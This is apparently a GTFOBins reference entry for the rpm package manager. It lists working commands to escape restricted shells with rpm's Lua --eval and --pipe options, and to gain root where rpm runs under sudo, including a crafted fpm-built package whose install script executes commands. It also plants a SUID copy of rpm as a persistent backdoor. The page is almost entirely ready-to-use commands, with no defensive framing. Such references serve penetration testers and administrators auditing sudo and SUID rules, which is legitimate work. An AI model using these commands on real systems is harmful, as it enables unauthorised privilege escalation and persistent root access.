# GTFOBin: rpm

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
rpm --eval '%{lua:os.execute("/bin/sh")}'
```

```
rpm --pipe '/bin/sh 0<&1'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
```

It runs commands using a specially crafted RPM package. Generate it with fpm and upload it to the target.

```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF

```

```
sudo rpm -ivh x-1.0-1.noarch.rpm
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which rpm) .

./rpm --eval '%{lua:os.execute("/bin/sh")}'
```